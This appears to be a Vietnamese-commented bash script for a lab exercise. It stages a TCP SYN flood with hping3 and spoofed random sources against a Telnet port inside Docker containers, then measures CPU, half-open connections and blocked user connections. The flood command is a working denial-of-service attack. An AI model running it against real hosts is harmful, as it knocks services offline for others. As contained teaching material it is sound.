#!/bin/bash
# Kich ban 2 (Lab 04): Tan cong TCP SYN Flood (Port 23 Telnet)
# Lenh PDF: sudo hping3 -S -p 23 <IP_Victim> --flood --rand-source

set -u

CONTAINER_VICTIM="lab04_victim"
CONTAINER_ATTACKER="lab04_attacker"
CONTAINER_USER="lab04_user"
IP_VICTIM="10.2.6.20"

PCAP_PATH="/tmp/lab04_sc2.pcap"

note() { printf '\n===== %s =====\n' "$1"; }

note "[Buoc 1 & 2] Quan sat thong so TRUOC tan cong tren Victim"
echo "--- CPU / RAM (top snapshot truoc tan cong) ---"
sudo docker exec "$CONTAINER_VICTIM" top -b -n 1 | head -n 12
echo "--- Trang thai ket noi SYN_RECV truoc tan cong ---"
sudo docker exec "$CONTAINER_VICTIM" ss -tan state syn-recv 2>/dev/null || true

note "[Buoc 3] Bat tcpdump bat goi tin TCP port 23 tren Victim"
sudo docker exec "$CONTAINER_VICTIM" rm -f "$PCAP_PATH"
sudo docker exec -d "$CONTAINER_VICTIM" tcpdump -i eth0 -n -w "$PCAP_PATH" "tcp port 23"

note "[Buoc 4] Attacker phat dong tan cong TCP SYN Flood vao port 23 trong 6 giay"
echo "Lenh thuc thi: hping3 -S -p 23 $IP_VICTIM --flood --rand-source"
if sudo docker exec "$CONTAINER_ATTACKER" which hping3 >/dev/null 2>&1; then
  sudo docker exec "$CONTAINER_ATTACKER" timeout 6 hping3 -S -p 23 "$IP_VICTIM" --flood --rand-source 2>/dev/null || true
else
  sudo timeout 6 hping3 -S -p 23 "$IP_VICTIM" --flood --rand-source 2>/dev/null || true
fi

note "[Buoc 5] User thu nghiem ket noi Telnet toi Victim trong luc tan cong"
echo "--- Thu nghiem ket noi Telnet (timeout 2s) ---"
if sudo docker exec "$CONTAINER_USER" nc -z -w 2 "$IP_VICTIM" 23; then
  echo "Ket noi thanh cong (co the do bo dem chua day hoan toan)"
else
  echo "[-] KET NOI TELNET BI TU CHOI / TIMEOUT do hang doi SYN Backlog bi tran!"
fi

note "[Buoc 6] Quan sat trang thai SYN_RECV va CPU tren Victim trong khi bi tan cong"
echo "--- Danh sach ket noi treo ban mo (SYN-RECV) ---"
sudo docker exec "$CONTAINER_VICTIM" ss -tan state syn-recv 2>/dev/null | head -n 10 || true
echo "--- CPU / RAM trong khi tan cong ---"
sudo docker exec "$CONTAINER_VICTIM" top -b -n 1 | head -n 12

note "[Buoc 7, 8, 9] Dung tan cong, ket thuc bat goi va phan tich ket qua"
sudo docker exec "$CONTAINER_VICTIM" pkill -9 tcpdump 2>/dev/null || true
sleep 1

echo "--- Thong ke goi tin SYN Flood bat duoc tren Victim ---"
sudo docker exec "$CONTAINER_VICTIM" tcpdump -n -r "$PCAP_PATH" -c 10 2>/dev/null || true
packet_count=$(sudo docker exec "$CONTAINER_VICTIM" tcpdump -n -r "$PCAP_PATH" 2>/dev/null | wc -l)
echo "[+] Tong so goi tin SYN bat duoc: $packet_count goi tin"

echo -e "\n[✓] HOAN THANH KICH BAN 2 (TCP SYN FLOOD)!"
